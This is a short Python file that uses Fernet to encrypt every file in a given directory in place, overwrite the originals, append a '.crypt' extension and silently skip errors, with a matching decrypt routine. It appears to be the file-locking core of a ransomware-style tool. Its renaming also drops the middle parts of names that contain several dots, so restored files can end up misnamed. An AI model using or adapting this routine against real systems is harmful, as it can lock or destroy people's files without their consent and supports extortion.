import os
from cryptography.fernet import Fernet

def initialize(key_dir):
    global key 
    with open (key_dir,"rb") as f:
        key = f.read()
        key = Fernet(key)

def encrypt(directory):
    for filename in os.listdir(directory):
        file = filename
        str_fn = str(filename)
        temp = filename.split('.')
        file_name = temp[0]
        file_extension = temp[-1]
        new_name = str(file_name+'.'+file_extension+'.crypt')

        if file_extension != 'crypt':
            try:
                with open(directory + file, 'rb') as f:
                    file = f.read()
                    
                    token = key.encrypt(file)

                    with open(directory+filename,'wb') as f:
                        f.write(token)
                    os.rename(directory+str_fn, directory+new_name)
            except:
                pass

def decrypt_dir(directory):
    for filename in os.listdir(directory):
        file = filename
        str_fn = str(filename)
        temp = filename.split('.')
        file_name = temp[0]
        file_extension = temp[-2]
        file_dummyX = temp[-1]
        new_name = str(file_name+'.'+file_extension)

        if file_dummyX == 'crypt':
            try:
                with open(directory + file, 'rb') as f:
                    file = f.read()

                token = key.decrypt(file)

                with open(directory + filename,'wb') as f:
                    f.write(token)
                os.rename(directory + str_fn, directory + new_name)
            except:
                pass